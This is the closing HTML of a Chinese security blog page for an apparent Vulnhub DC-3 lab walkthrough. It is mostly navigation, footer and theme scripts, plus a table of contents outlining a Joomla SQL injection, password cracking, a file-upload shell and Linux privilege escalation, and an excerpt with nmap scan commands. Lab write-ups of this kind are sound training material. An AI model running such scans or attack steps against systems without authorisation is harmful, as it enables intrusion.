+            <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="LilacCTF2026" class="lazyload">
+          
+        
+        <a href="/2026/01/27/LilacCTF2026/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            LilacCTF2026
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/bg1.jpg" data-sizes="auto" alt="SQL注入绕过PDO预处理语句" class="lazyload">
+        
+      
+      <a href="/2026/01/26/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87PDO%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          SQL注入绕过PDO预处理语句
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla370-sql%E6%B3%A8%E5%85%A5nmapjoomscannikto"><span class="toc-number">1.2.</span> <span class="toc-text"> Joomla3.7.0 SQL注入（nmap&#x2F;Joomscan&#x2F;nikto）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#john%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text"> John爆破密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell"><span class="toc-number">1.4.</span> <span class="toc-text"> 文件上传getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-exploit-suggester%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> Linux-Exploit-Suggester提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[Vulnhub靶机通关]DC-3",
+          url: "http://example.com/2026/01/26/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-3/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC] 下载镜像，导入虚拟机，改为NAT模式，启动DC-3时会报个小错  解决方法：here  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.0/24  锁定为192.168.139.131 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.131  开了web服务，是一个CMS-Joomla  Joomla3.7.0 SQL注入（nmap/Joomscan/nikto） 访问  用nmap探测",
+          date: "Mon Jan 26 2026 21:25:25 GMT+0800",
+          updated: "Tue Jan 27 2026 14:41:12 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
